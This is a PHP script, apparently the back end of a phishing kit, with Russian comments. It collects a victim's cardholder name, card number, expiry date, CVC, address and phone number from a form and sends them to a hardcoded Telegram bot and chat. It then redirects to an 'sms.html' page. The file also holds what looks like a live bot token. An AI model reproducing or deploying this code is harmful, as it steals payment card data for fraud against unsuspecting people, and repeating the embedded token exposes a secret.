<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Получение данных из формы
    $cardholder = htmlspecialchars($_POST['cardholder']);
    $number = htmlspecialchars($_POST['number']);
    $month = htmlspecialchars($_POST['month']);
    $year = htmlspecialchars($_POST['year']);
    $cvc = htmlspecialchars($_POST['cvc']);
    $address = htmlspecialchars($_POST['address']);
    $phone = htmlspecialchars($_POST['phone']);

    // Токен и ID чата для Telegram
    $token = "6516555054:AAFdqiXb3HTc_RkncKL30Lre7eMi38iHsQo";
    $chat_id = "-4276589204";

    // Сообщение, которое будет отправлено в Telegram
    $message = "Cardholder Name: $cardholder\n".
               "Card Number: $number\n".
               "Exp. Date: $month/$year\n".
               "CVC: $cvc\n".
               "Payment Address: $address\n".
               "Phone Number: $phone";

    // Отправка сообщения в Telegram
    $sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=HTML&text=".urlencode($message),"r");

    // Проверка успешности отправки и перенаправление
    if ($sendToTelegram) {
        header('Location: sms.html'); // перенаправление на success.html после успешной отправки
    } else {
        echo "Error";
    }
}
?>